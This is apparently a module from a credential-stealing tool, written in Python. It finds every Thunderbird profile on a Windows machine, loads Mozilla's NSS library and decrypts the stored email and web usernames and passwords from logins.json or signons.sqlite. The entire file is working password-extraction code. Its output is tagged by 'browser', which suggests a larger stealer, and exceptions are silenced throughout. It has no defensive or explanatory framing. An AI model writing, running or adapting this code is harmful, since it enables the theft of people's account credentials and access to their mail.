import ctypes as ct
import json
import os
import sqlite3
import sys
from base64 import b64decode
from configparser import ConfigParser

DEFAULT_ENCODING = "utf-8"

class c_char_p_fromstr(ct.c_char_p):
    """ctypes char_p override that handles encoding str to bytes"""
    def from_param(self):
        return self.encode(DEFAULT_ENCODING)

def find_nss_windows():
    """Locate NSS library on Windows for Thunderbird"""
    nssname = "nss3.dll"
    locations = [
        "",  # Current directory
        os.path.expanduser("~\\AppData\\Local\\Thunderbird"),
        "C:\\Program Files\\Mozilla Thunderbird",
        "C:\\Program Files (x86)\\Mozilla Thunderbird",
        os.path.expanduser("~\\AppData\\Local\\Mozilla Thunderbird"),
    ]

    for loc in locations:
        nsslib = os.path.join(loc, nssname) if loc else nssname
        
        if loc and os.path.isdir(loc):
            os.environ["PATH"] = ";".join([loc, os.environ["PATH"]])
            workdir = os.getcwd()
            os.chdir(loc)

        try:
            nss = ct.CDLL(nsslib)
            return nss
        except OSError:
            pass
        finally:
            if loc and os.path.isdir(loc):
                os.chdir(workdir)

    raise Exception("NSS library not found")

class NSSProxy:
    class SECItem(ct.Structure):
        _fields_ = [
            ("type", ct.c_uint),
            ("data", ct.c_char_p),
            ("len", ct.c_uint),
        ]

        def decode_data(self):
            _bytes = ct.string_at(self.data, self.len)
            return _bytes.decode(DEFAULT_ENCODING)

    class PK11SlotInfo(ct.Structure):
        pass

    def __init__(self):
        self.libnss = find_nss_windows()
        
        SlotInfoPtr = ct.POINTER(self.PK11SlotInfo)
        SECItemPtr = ct.POINTER(self.SECItem)

        # Set up function signatures
        self.libnss.NSS_Init.argtypes = [c_char_p_fromstr]
        self.libnss.NSS_Init.restype = ct.c_int
        
        self.libnss.NSS_Shutdown.argtypes = []
        self.libnss.NSS_Shutdown.restype = ct.c_int
        
        self.libnss.PK11SDR_Decrypt.argtypes = [SECItemPtr, SECItemPtr, ct.c_void_p]
        self.libnss.PK11SDR_Decrypt.restype = ct.c_int
        
        self.libnss.SECITEM_ZfreeItem.argtypes = [SECItemPtr, ct.c_int]
        self.libnss.SECITEM_ZfreeItem.restype = None

    def initialize(self, profile_path):
        profile_path = "sql:" + profile_path
        err_status = self.libnss.NSS_Init(profile_path)
        if err_status:
            raise Exception(f"Failed to initialize NSS")

    def shutdown(self):
        try:
            self.libnss.NSS_Shutdown()
        except:
            pass

    def decrypt(self, data64):
        try:
            data = b64decode(data64)
            inp = self.SECItem(0, data, len(data))
            out = self.SECItem(0, None, 0)

            err_status = self.libnss.PK11SDR_Decrypt(inp, out, None)
            
            try:
                if err_status:
                    return None
                res = out.decode_data()
            finally:
                self.libnss.SECITEM_ZfreeItem(out, 0)

            return res
        except:
            return None

class JsonCredentials:
    def __init__(self, profile):
        self.db = os.path.join(profile, "logins.json")
        if not os.path.isfile(self.db):
            raise FileNotFoundError()

    def get_credentials(self):
        with open(self.db, encoding='utf-8') as fh:
            data = json.load(fh)
            logins = data.get("logins", [])
            
            for login in logins:
                try:
                    yield (
                        login["hostname"],
                        login["encryptedUsername"],
                        login["encryptedPassword"],
                        login["encType"]
                    )
                except KeyError:
                    continue

class SqliteCredentials:
    def __init__(self, profile):
        self.db = os.path.join(profile, "signons.sqlite")
        if not os.path.isfile(self.db):
            raise FileNotFoundError()
        
        self.conn = sqlite3.connect(self.db)
        self.cursor = self.conn.cursor()

    def get_credentials(self):
        self.cursor.execute("SELECT hostname, encryptedUsername, encryptedPassword, encType FROM moz_logins")
        for row in self.cursor:
            yield row

    def close(self):
        self.cursor.close()
        self.conn.close()

def get_all_profiles():
    """Get all Thunderbird profile paths"""
    thunderbird_path = os.path.join(os.environ["APPDATA"], "Thunderbird")
    profileini = os.path.join(thunderbird_path, "profiles.ini")
    
    profiles = []
    
    if not os.path.isfile(profileini):
        return profiles

    config = ConfigParser()
    config.read(profileini, encoding=DEFAULT_ENCODING)
    
    for section in config.sections():
        if section.startswith("Profile"):
            try:
                profile_path = config.get(section, "Path")
                is_relative = config.getboolean(section, "IsRelative", fallback=True)
                
                if is_relative:
                    full_path = os.path.join(thunderbird_path, profile_path)
                else:
                    full_path = profile_path
                
                if os.path.isdir(full_path):
                    profiles.append(full_path)
                    
            except Exception:
                continue
    
    return profiles

def extract_email_accounts(profile_path):
    """Extract email account passwords from Thunderbird profile"""
    results = []
    
    try:
        # Check for account password files
        prefs_js = os.path.join(profile_path, "prefs.js")
        if os.path.exists(prefs_js):
            results.extend(_extract_from_prefs(prefs_js, profile_path))
        
        # Check for stored passwords in login files
        results.extend(_extract_stored_passwords(profile_path))
        
    except Exception:
        pass
    
    return results

def _extract_from_prefs(prefs_file, profile_path):
    """Extract email account info from prefs.js"""
    results = []
    
    try:
        with open(prefs_file, 'r', encoding='utf-8') as f:
            content = f.read()
        
        # Parse email accounts from prefs
        accounts = {}
        lines = content.split('\n')
        
        for line in lines:
            if 'mail.account.' in line and 'server' in line:
                # Extract account server info
                if 'hostname' in line:
                    parts = line.split('"')
                    if len(parts) >= 4:
                        account_key = parts[1]
                        hostname = parts[3]
                        accounts[account_key] = {'hostname': hostname}
                
                elif 'username' in line:
                    parts = line.split('"')
                    if len(parts) >= 4:
                        account_key = parts[1]
                        username = parts[3]
                        if account_key in accounts:
                            accounts[account_key]['username'] = username
        
        # Try to get passwords for these accounts using NSS
        if accounts:
            try:
                nss = NSSProxy()
                nss.initialize(profile_path)
                
                # Look for encrypted passwords in stored logins
                stored_passwords = _get_stored_passwords_with_nss(profile_path, nss)
                
                for account_info in accounts.values():
                    hostname = account_info.get('hostname', '')
                    username = account_info.get('username', '')
                    
                    # Try to match with stored passwords
                    for stored in stored_passwords:
                        if hostname in stored.get('url', '') or username in stored.get('username', ''):
                            results.append({
                                'browser': 'Thunderbird',
                                'url': hostname,
                                'username': username,
                                'password': stored.get('password', '')
                            })
                            break
                
                nss.shutdown()
                
            except Exception:
                pass
    
    except Exception:
        pass
    
    return results

def _get_stored_passwords_with_nss(profile_path, nss):
    """Get stored passwords using NSS decryption"""
    results = []
    
    try:
        # Try JSON credentials first
        try:
            credentials = JsonCredentials(profile_path)
            cred_iter = credentials.get_credentials()
        except FileNotFoundError:
            try:
                credentials = SqliteCredentials(profile_path)
                cred_iter = credentials.get_credentials()
            except FileNotFoundError:
                return results
        
        for url, enc_user, enc_pass, enctype in cred_iter:
            if enctype:
                username = nss.decrypt(enc_user)
                password = nss.decrypt(enc_pass)
            else:
                username = enc_user
                password = enc_pass
            
            if username and password:
                results.append({
                    'url': url,
                    'username': username,
                    'password': password
                })
        
        if hasattr(credentials, 'close'):
            credentials.close()
    
    except Exception:
        pass
    
    return results

def _extract_stored_passwords(profile_path):
    """Extract stored passwords from Thunderbird profile"""
    results = []
    
    try:
        nss = NSSProxy()
        nss.initialize(profile_path)
        
        credentials = None
        try:
            credentials = JsonCredentials(profile_path)
            cred_iter = credentials.get_credentials()
        except FileNotFoundError:
            try:
                credentials = SqliteCredentials(profile_path)
                cred_iter = credentials.get_credentials()
            except FileNotFoundError:
                nss.shutdown()
                return results
        
        for url, enc_user, enc_pass, enctype in cred_iter:
            if enctype:
                username = nss.decrypt(enc_user)
                password = nss.decrypt(enc_pass)
            else:
                username = enc_user
                password = enc_pass
            
            if username and password:
                # Filter for email-related entries (common mail protocols)
                if any(protocol in url.lower() for protocol in ['smtp', 'pop', 'imap', 'mail', '@']):
                    results.append({
                        'browser': 'Thunderbird',
                        'url': url,
                        'username': username,
                        'password': password
                    })
        
        if hasattr(credentials, 'close'):
            credentials.close()
        nss.shutdown()
        
    except Exception:
        pass
    
    return results

def fetch_thunderbird_passwords():
    """Main function to extract Thunderbird passwords from all profiles"""
    all_results = []
    profiles = get_all_profiles()
    
    for profile_path in profiles:
        # Extract email account passwords
        results = extract_email_accounts(profile_path)
        all_results.extend(results)
        
        # Also extract any stored web passwords
        results = _extract_stored_passwords(profile_path)
        all_results.extend(results)
    
    return all_results
